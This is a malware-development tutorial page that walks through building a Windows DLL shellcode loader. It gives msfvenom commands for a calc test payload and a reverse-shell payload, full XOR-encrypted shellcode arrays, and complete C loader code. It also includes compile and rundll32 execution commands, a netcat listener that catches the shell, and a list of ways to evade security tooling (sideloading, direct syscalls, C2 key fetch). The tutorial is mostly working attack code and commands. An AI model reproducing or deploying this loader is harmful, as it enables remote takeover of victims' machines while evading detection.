---
layout: default
title: Simple DLL Loader
parent: Maldev Resources
nav_order: 3
---

# Creating a Simple DLL Loader

A simple reflective in-memory shellcode loader is one of the first steps in writing malware targeted for Windows machines, but lets first figure out what this means. Firstly, 'in-memory' means that the payload/shellcode is never written to disk and instead exists in a dynamically allocated memory region at runtime. A 'loader' is the DLL itself, whose job is to load and execute the payload, handling decryption, memory allocation, permissions, and thread creation. The 'shellcode' is position independent code that doesnt rely on being a proper portable executable (PE) file, this can be injected and executed from any RX (read/execute) memory region. 

This loader example decrypts a XOR encrypted payload at runtime, allocates the executable memory, and executed the shellcode entirely in process memory without writing any plaintext payload to disk, there are many advantages to this:
- The shellcode runs inside the loading process, and in this case is a signed microsoft binary.
- No raw `.exe` file exists on disk, these are heavily scrutinised, and as the target application runs it, there is no suspicious invocation.
- The shellcode never touches the disk as plaintext, so static analysis of the DLL cannot produce anything recognisable.
- As the shellcode is only executed in memory, there is no file to scan or recover after the fact (though it can be extracted from the DLL with the decryption key).
- The loader logic is generic and the payload can be swapped without changing anything else.

We use a couple of tools here:
- Shellcrypt [https://github.com/Whispergate/Shellcrypt](https://github.com/Whispergate/Shellcrypt) - A forked and updated tool that offers a simple way to obfuscate payloads.
- msfvenom [https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) - msfvenom is a command-line payload generation tool from the Metasploit Framework, used to create and encode shellcode in a variety of formats and architectures.


### PoC - calc.exe

Before testing with a live payload, lets demonstrate the basics of the loader with a benign payload of 'calc.exe', this is a standard sanity check in malware development, as if calc pops, the loader is performing all of its tasks correctly.

```
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
```

![](/assets/images/maldev/simpledllloader/shellcrypt2.PNG)

And lets quickly look at the Shellcrypt help menu, I recommend viewing and testing the various formats, ciphers, etc. on your own.

```
PS C:\tools\Shellcrypt> uv run .\main.py -h
   _____ __         ____                      __
  / ___// /_  ___  / / /___________  ______  / /_
  \__ \/ __ \/ _ \/ / / ___/ ___/ / / / __ \/ __/
 ___/ / / / /  __/ / / /__/ /  / /_/ / /_/ / /_
/____/_/ /_/\___/_/_/\___/_/   \__, / .___/\__/
                              /____/_/
v2.0 - Release

By: @0xLegacyy (Jordan Jay)

usage: shellcrypt [-h] [-i INPUT] [-e ENCRYPT] [--decrypt] [-d ENCODE] [-c COMPRESS] [-k KEY] [-n NONCE] [-f FORMAT]
                  [--formats] [--ciphers] [--encoders] [--compressors] [-o OUTPUT] [-a ARRAY] [-v] [--preserve-null]
                  [--key-length KEY_LENGTH] [--steg-embed IMAGE] [--steg-extract IMAGE] [--steg-bits {1,2,3,4}]
                  [--steg-capacity IMAGE]

options:
  -h, --help            show this help message and exit
  -i, --input INPUT     Path to file to be encrypted.
  -e, --encrypt ENCRYPT
                        Encryption method to use, default None.
  --decrypt             Decrypt mode: Decode -> Decrypt -> Decompress.
  -d, --encode ENCODE   Encoding method to use, default None.
  -c, --compress COMPRESS
                        Compression method to use.
  -k, --key KEY         Encryption key in hex format, default (random 16 bytes).
  -n, --nonce NONCE     Encryption nonce in hex format, default (random 16 bytes).
  -f, --format FORMAT   Output format, specify --formats for a list of formats.
  --formats             Show a list of valid formats
  --ciphers             Show a list of valid ciphers
  --encoders            Show a list of valid encoders
  --compressors         Show a list of valid compressors
  -o, --output OUTPUT   Path to output file
  -a, --array ARRAY     Array Name, default sh3llc0d3
  -v, --version         Shows the version and exits
  --preserve-null       Avoid XORing null bytes during XOR encryption.
  --key-length KEY_LENGTH
                        Specify the key length in bytes (default is 16).
  --steg-embed IMAGE    Embed output into an image (PNG/BMP/ICO) via LSB steganography.
  --steg-extract IMAGE  Extract hidden payload from a steganographic image.
  --steg-bits {1,2,3,4}
                        LSB bits per channel (1=stealthiest, 4=max capacity). Default 1.
  --steg-capacity IMAGE
                        Show the payload capacity of an image and exit.
```

![](/assets/images/maldev/simpledllloader/shellcrypt1.PNG)

We will encrypt with a simple 2-byte key for this demo, noting that we use hex for the key. I have opted for '1234' here.

```
  PS C:\tools\Shellcrypt> uv run .\main.py -i shellcode.bin -e xor -k 1234 -f c
   _____ __         ____                      __
  / ___// /_  ___  / / /___________  ______  / /_
  \__ \/ __ \/ _ \/ / / ___/ ___/ / / / __ \/ __/
 ___/ / / / /  __/ / / /__/ /  / /_/ / /_/ / /_
/____/_/ /_/\___/_/_/\___/_/   \__, / .___/\__/
                              /____/_/
v2.0 - Release

By: @0xLegacyy (Jordan Jay)

[22:21:48] DEBUG    [+] Input file: 'shellcode.bin'                                                        logging.py:41
           DEBUG    [+] Output format: c                                                                   logging.py:41
           DEBUG    [+] Output Compression: None                                                           logging.py:41
           DEBUG    [+] Output Encryption: xor                                                             logging.py:41
           DEBUG    [+] Output Encoding: None                                                              logging.py:41
           DEBUG    [+] Using key: 1234                                                                    logging.py:41
           INFO     Encrypting Shellcode                                                                     main.py:344
           DEBUG    [+] Successfully processed input file (276 bytes)                                      logging.py:41
           INFO     [!] Deobfuscation Routine: Decode -> Decrypt -> Decompress                             logging.py:46

unsigned char key[2] = {
        0x12,0x34
};

unsigned char sh3llc0d3[276] = {
        0xee,0x7c,0x91,0xd0,0xe2,0xdc,0xd2,0x34,0x12,0x34,0x53,0x65,0x53,0x64,0x40,
        0x65,0x44,0x7c,0x23,0xe6,0x77,0x7c,0x99,0x66,0x72,0x7c,0x99,0x66,0x0a,0x7c,
        0x99,0x66,0x32,0x7c,0x99,0x46,0x42,0x7c,0x1d,0x83,0x58,0x7e,0x5f,0x05,0xdb,
        0x7c,0x23,0xf4,0xbe,0x08,0x73,0x48,0x10,0x18,0x32,0x75,0xd3,0xfd,0x1f,0x75,
        0x13,0xf5,0xf0,0xd9,0x40,0x75,0x43,0x7c,0x99,0x66,0x32,0xbf,0x50,0x08,0x5a,
        0x35,0xc2,0xbf,0x92,0xbc,0x12,0x34,0x12,0x7c,0x97,0xf4,0x66,0x53,0x5a,0x35,
        0xc2,0x64,0x99,0x7c,0x0a,0x70,0x99,0x74,0x32,0x7d,0x13,0xe4,0xf1,0x62,0x5a,
        0xcb,0xdb,0x75,0x99,0x00,0x9a,0x7c,0x13,0xe2,0x5f,0x05,0xdb,0x7c,0x23,0xf4,
        0xbe,0x75,0xd3,0xfd,0x1f,0x75,0x13,0xf5,0x2a,0xd4,0x67,0xc5,0x5e,0x37,0x5e,
        0x10,0x1a,0x71,0x2b,0xe5,0x67,0xec,0x4a,0x70,0x99,0x74,0x36,0x7d,0x13,0xe4,
        0x74,0x75,0x99,0x38,0x5a,0x70,0x99,0x74,0x0e,0x7d,0x13,0xe4,0x53,0xbf,0x16,
        0xbc,0x5a,0x35,0xc2,0x75,0x4a,0x75,0x4a,0x6a,0x4b,0x6e,0x53,0x6c,0x53,0x6d,
        0x53,0x6e,0x5a,0xb7,0xfe,0x14,0x53,0x66,0xed,0xd4,0x4a,0x75,0x4b,0x6e,0x5a,
        0xbf,0x00,0xdd,0x45,0xcb,0xed,0xcb,0x4f,0x7c,0xa8,0x35,0x12,0x34,0x12,0x34,
        0x12,0x34,0x12,0x7c,0x9f,0xb9,0x13,0x35,0x12,0x34,0x53,0x8e,0x23,0xbf,0x7d,
        0xb3,0xed,0xe1,0xa9,0xf9,0x76,0xab,0x7a,0x75,0xa8,0x92,0x87,0x89,0x8f,0xcb,
        0xc7,0x7c,0x91,0xf0,0x3a,0x08,0x14,0x48,0x18,0xb4,0xe9,0xd4,0x67,0x31,0xa9,
        0x73,0x01,0x46,0x7d,0x5e,0x12,0x6d,0x53,0xbd,0xc8,0xcb,0xc7,0x57,0x73,0x58,
        0x71,0x1a,0x77,0x4c,0x77,0x34
};
```

![](/assets/images/maldev/simpledllloader/shellcrypt3.png)

We have our shellcode and our key, but we need a way to load it:

```
#include <windows.h>


unsigned char encryptedShellcode[] = {
    0xee,0x7c,0x91,0xd0,0xe2,0xdc,0xd2,0x34,0x12,0x34,0x53,0x65,0x53,0x64,0x40,
    <SNIP>
    0x71,0x1a,0x77,0x4c,0x77,0x34
};

// XOR key
unsigned char key[] = { 0x12, 0x34 };
SIZE_T shellcodeLen = sizeof(encryptedShellcode);

void Decrypt() {
    for (SIZE_T i = 0; i < shellcodeLen; i++) {
        encryptedShellcode[i] ^= key[i % sizeof(key)];
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        Decrypt();

        LPVOID mem = VirtualAlloc(NULL, shellcodeLen,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);  // RW first
        if (!mem) return FALSE;

        memcpy(mem, encryptedShellcode, shellcodeLen);

        DWORD oldProtect;
        VirtualProtect(mem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);  // then RX

        HANDLE hThread = CreateThread(NULL, 0,
                                      (LPTHREAD_START_ROUTINE)mem,
                                      NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
```

Lets break this down a little bit better:

The `Decrypt()` function is a simple rolling XOR loop, it takes each byte of the encrypted shellcode and XORs it against the corresponding byte of the key, cycling through it using `i % sizeof(key)`. XOR is its own inverse, so the same function works for both encryption and decryption.

`DLLMain` is the entry point for the DLL, and this is called by Windows whenever the DLL is loaded or unloaded. `ul_reason_for_call` parameter tells us why it was called, we check for DLL_PROCESS_ATTACH, which fires when the DLL is first loaded into a process, and this is where the payload is triggered.

`VirtualAlloc` is a WinAPI that reserves and commits a region of memory in the processes address space, we request a space of memory and back it with physical memory with `MEM_COMMIT | MEM_RESERVE`, at this stage the memory is only allocated as `PAGE_READWRITE` as making it executable at the same time is a strong detection signal.

`memcpy` is used to write the decrypted shellcode bytes into the allocated memory region.

`VirtualProtect` changes the memory region to `PAGE_EXECUTE_READ` after the shellcode has been written, at this stage it is no longer writable, and is a cleaner evasion profile (please do not think you'll get this past EDR).

`CreateThread` creates a new thread in the current process, we then cast the base address of the shellcode buffer to `LPTHREAD_START_ROUTINE` that instructed the CPU to execute our shellcode as a thread within the host process. Since calc.exe launches its own process, we can use `CloseHandle` to release the thread handle and let the host process exit cleanly.

#### Compiling and Testing

We can compile with mingw32, the advantage of using mingw32 is that you can do this on a Kali, or other Linux host, if you choose.
```
x86_64-w64-mingw32-gcc -shared -o evil.dll dllmain.c -w
```

![](/assets/images/maldev/simpledllloader/shellcrypt4.PNG)

`-shared` tells gcc to produce a DLL rather than an executable. `-w` suppresses warnings. We then invoke it with:

```
rundll32.exe .\evil.dll,Run
```

![](/assets/images/maldev/simpledllloader/shellcrypt5.PNG)

We should see Calculator pop, proving that the loader works.

### Revshell Time

Since we've proven we can load calc, we want to move into something more useful. Since we're changing the payload, and the overall function, we need to make a few modifications to handle a reverse shell correctly. Unlike calc, which spawns its own process and exits in milliseconds, a reverse shell needs to maintain a persistent connection, this introduces a process lifetime problem.

When rundll32 calls our exported `Run()` function, it will exit as soon as that function returns, killing every thread in the process along with it including our shell session. We also can’t block inside `DllMain` to prevent this; doing so causes a loader lock deadlock, as the OS holds a lock during `DllMain` execution that the shell thread may also need to acquire.

The solution is to move all execution out of DllMain and into an exported function, then block that function until the shell thread exits.

First, generate a reverse shell payload with `msfvenom`:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=1234 -f raw -o shellcode.bin
```

Now, encrypt it with Shellcrypt, I have changed the key this time:
```
PS C:\Tools\Shellcrypt> uv run .\main.py -i shellcode.bin -e xor -k 1234ef1234ef -f c
   _____ __         ____                      __
  / ___// /_  ___  / / /___________  ______  / /_
  \__ \/ __ \/ _ \/ / / ___/ ___/ / / / __ \/ __/
 ___/ / / / /  __/ / / /__/ /  / /_/ / /_/ / /_
/____/_/ /_/\___/_/_/\___/_/   \__, / .___/\__/
                              /____/_/
v2.0 - Release

By: @0xLegacyy (Jordan Jay)

[22:44:54] DEBUG    [+] Input file: 'shellcode.bin'                                                        logging.py:41
           DEBUG    [+] Output format: c                                                                   logging.py:41
           DEBUG    [+] Output Compression: None                                                           logging.py:41
           DEBUG    [+] Output Encryption: xor                                                             logging.py:41
           DEBUG    [+] Output Encoding: None                                                              logging.py:41
           DEBUG    [+] Using key: 1234ef1234ef                                                            logging.py:41
           INFO     Encrypting Shellcode                                                                     main.py:344
           DEBUG    [+] Successfully processed input file (2144 bytes)                                     logging.py:41
           INFO     [!] Deobfuscation Routine: Decode -> Decrypt -> Decompress                             logging.py:46

unsigned char key[6] = {
        0x12,0x34,0xef,0x12,0x34,0xef
};

unsigned char sh3llc0d3[460] = {
        0xee,0x7c,0x6c,0xf6,0xc4,0x07,0xd2,0x34,0xef,0x12,0x75,0xbe,0x53,0x64,0xbd,
        0x43,0x62,0xa7,0x23,0xe6,0x8a,0x5a,0xbf,0xbd,0x72,0x7c,0x64,0x40,0x2c,0xa7,
        0x99,0x66,0xcf,0x5a,0xbf,0x9d,0x42,0x7c,0xe0,0xa5,0x7e,0xa5,0x5f,0x05,0x26,
        0x5a,0x05,0x2f,0xbe,0x08,0x8e,0x6e,0x36,0xc3,0x32,0x75,0x2e,0xdb,0x39,0xae,
        0x13,0xf5,0x0d,0xff,0x66,0xae,0x43,0x7c,0x64,0x40,0x14,0x64,0x50,0x08,0xa7,
        0x13,0xe4,0x64,0x92,0xbc,0xef,0x12,0x34,0xa7,0x97,0xf4,0x9b,0x75,0x7c,0xee,
        0xc2,0x64,0x64,0x5a,0x2c,0xab,0x99,0x74,0xcf,0x5b,0x35,0x3f,0xf1,0x62,0xa7,
        0xed,0xfd,0xae,0x99,0x00,0x67,0x5a,0x35,0x39,0x5f,0x05,0x26,0x5a,0x05,0x2f,
        0xbe,0x75,0x2e,0xdb,0x39,0xae,0x13,0xf5,0xd7,0xf2,0x41,0x1e,0x5e,0x37,0xa3,
        0x36,0x3c,0xaa,0x2b,0xe5,0x9a,0xca,0x6c,0xab,0x99,0x74,0xcb,0x5b,0x35,0x3f,
        0x74,0x75,0x64,0x1e,0x7c,0xab,0x99,0x74,0xf3,0x5b,0x35,0x3f,0x53,0xbf,0xeb,
        0x9a,0x7c,0xee,0xc2,0x75,0xb7,0x53,0x6c,0xb1,0x4b,0x6e,0xae,0x4a,0x75,0xb6,
        0x53,0x6e,0xa7,0x91,0xd8,0xcf,0x53,0x66,0x10,0xf2,0x6c,0xae,0x4b,0x6e,0xa7,
        0x99,0x26,0x06,0x45,0xcb,0x10,0xed,0x69,0xa6,0xac,0x43,0x9c,0x20,0x6b,0xdc,
        0x20,0x34,0xef,0x53,0x62,0xa6,0x9b,0xd2,0xa7,0x93,0xd8,0x4f,0x13,0x34,0xef,
        0x5b,0xbd,0x0a,0x5b,0x88,0xed,0x12,0x30,0x3d,0xd2,0x9c,0xad,0x92,0x75,0xbb,
        0x5b,0xbd,0x0b,0x5e,0xbd,0x1e,0x53,0x8e,0xa3,0x65,0x12,0xe8,0xed,0xe1,0xa3,
        0x9b,0xde,0x87,0x13,0x35,0xef,0x12,0x6d,0xae,0xa8,0x1d,0x6f,0x79,0x34,0x10,
        0xc7,0x64,0xbf,0x5f,0x05,0x26,0x5f,0x05,0x2f,0x5a,0xcb,0x2f,0x5a,0xbd,0x2d,
        0x5a,0xcb,0x2f,0x5a,0xbd,0x2e,0x53,0x8e,0x05,0x1d,0xeb,0x0f,0xed,0xe1,0xa7,
        0x9b,0xf3,0x85,0x02,0x75,0xb7,0x5e,0xbd,0x0d,0x5a,0xbd,0x16,0x53,0x8e,0x76,
        0xb7,0x40,0x8e,0xed,0xe1,0xa7,0x93,0xf0,0xaf,0x10,0x34,0xef,0x5b,0x8c,0x8c,
        0x7f,0x50,0xef,0x12,0x34,0xef,0x12,0x75,0xbf,0x53,0x64,0xa7,0x9b,0xd6,0xb8,
        0x45,0x63,0xa2,0x23,0xf4,0x85,0x1f,0x6d,0xae,0x42,0xd6,0x13,0x74,0xf3,0xab,
        0x36,0x60,0xee,0x13,0x7c,0x62,0x56,0x10,0xf7,0xd4,0x34,0x87,0x5a,0xbd,0x09,
        0x44,0x64,0xae,0x42,0x75,0xbf,0x53,0x64,0xa6,0xed,0xf4,0xae,0x42,0x7d,0x10,
        0xda,0x79,0x66,0xd3,0x78,0x66,0xd3,0x75,0x55,0x6b,0xf8,0xd0,0x94,0xcb,0x3a,
        0x5a,0x05,0x3d,0x5a,0xcb,0x25,0x99,0x3a,0xae,0xa8,0x3c,0x68,0x0f,0x54,0x10,
        0xc7,0x8f,0x74,0xc9,0x05,0x1f,0x53,0x8e,0x49,0x87,0x89,0x72,0xed,0xe1,0xa7,
        0x91,0xf0,0xc7,0x2e,0x32,0x93,0x18,0xb4,0x14,0xf2,0x41,0xea,0xa9,0x73,0xfc,
        0x60,0x5b,0x85,0x12,0x6d,0xae,0x9b,0xee,0x10,0xc7
};
```

Here is our new `DLL`:

```
#include <windows.h>


unsigned char encryptedShellcode[] = {
    0xee,0x7c,0x6c,0xf6,0xc4,0x07,0xd2,0x34,0xef,0x12,0x75,0xbe,0x53,0x64,0xbd,
    <SNIP>
    0x60,0x5b,0x85,0x12,0x6d,0xae,0x9b,0xee,0x10,0xc7
};

// XOR key
unsigned char key[] = { 0x12,0x34,0xef,0x12,0x34,0xef };
SIZE_T shellcodeLen = sizeof(encryptedShellcode);

void Decrypt() {
    for (SIZE_T i = 0; i < shellcodeLen; i++) {
        encryptedShellcode[i] ^= key[i % sizeof(key)];
    }
}

__declspec(dllexport) void Run(void) {
    Decrypt();

    LPVOID mem = VirtualAlloc(NULL, shellcodeLen,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return;

    memcpy(mem, encryptedShellcode, shellcodeLen);

    DWORD oldProtect;
    VirtualProtect(mem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
```

`__declspec(dllexport)` makes `Run` visible in the DLL’s export table so rundll32 can call it by name. `WaitForSingleObject` with `INFINITE` blocks until the shell thread exits, so the process stays alive for exactly as long as the session is active, and exits cleanly when the connection closes. Understanding this is quite a change from the code given to test calc, it is important to understand that calc will still execute in this format.

#### Connect Back

On our attacker machine, the one we want to connect back to, start a reverse shell:

```
nc -lvnp 1234
```

Now lets compile and run:

```
x86_64-w64-mingw32-gcc -shared -o evil.dll dllmain.c -w
rundll32.exe .\evil.dll,Run
```

![](/assets/images/maldev/simpledllloader/shellcrypt6.png)

Shell lands.

### Limitations

This is a deliberately simple loader, and it works, but there are several weaknesses worth being honest about.

The XOR key lives in the binary. Both the encrypted shellcode and the decryption key are stored in the DLL’s data section. A determined analyst with the binary can extract both and decrypt the payload trivially. XOR with a static embedded key is obfuscation and must not be mistaken for real protection.

XOR is a weak cipher. A short repeating XOR key is trivially broken with frequency analysis, especially against shellcode which has predictable structure. XOR ciphers can easily defeat signature-based detection but won’t survive manual analysis.

msfvenom shellcode is heavily signatured, and even though it is encrypted, the decrypted payload in memory at runtime is recognisable to behaviour-based detection. The loader evades static analysis and does not evade behavioural EDR.

RW to RX is better than RWX, but still detectable. The `VirtualAlloc` to `VirtualProtect` pattern is well understood by EDR vendors. The sequence of allocating anonymous memory, writing to it, flipping permissions, and creating a thread is a strong behavioural signal regardless of the permission split.

rundll32 is a known LOLbin. Executing payloads via rundll32 is heavily monitored. Most mature EDR products will alert on rundll32 loading an unsigned DLL from a user-writable path.

### Next Steps

The natural progression from here:

Stronger encryption by swapping XOR for AES-256. Shellcrypt supports it with `-e aes`, making it harder to reverse, with no frequency analysis weaknesses.

Remote key fetch. Don’t store the key in the binary at all, and instead fetch it from a C2 server at runtime over HTTPS. Without the key the DLL is useless to an analyst, and the key can be revoked remotely.

Environment keying. Derive the decryption key from something on the target machine, such as the domain name, username, or MAC address. The shellcode only decrypts in the correct environment, defeating sandbox analysis.

Direct syscalls. Replace `VirtualAlloc`, `VirtualProtect`, and `CreateThread` with direct syscalls that bypass the userland hooks EDR places on `ntdll.dll`. Hell’s Gate and Halo’s Gate are good starting points here.

Shellcode stomping. Instead of allocating new anonymous memory, overwrite an existing legitimate executable region such as a loaded DLL’s backing memory, this avoids the suspicious VirtualAlloc and permission flip sequence entirely.

Better C2 shellcode. Ditch msfvenom. Sliver, Havoc, and other, easily accessible tools generate shellcode with far lower detection rates and better operational security.

DLL sideloading. Rather than invoking via rundll32, find a legitimate signed application that loads a DLL by a name you control, drop your DLL in its path, and let the application load it naturally. No suspicious process invocation with execution under a trusted signed binary.

Each one of these is its own rabbit hole, and worth exploring.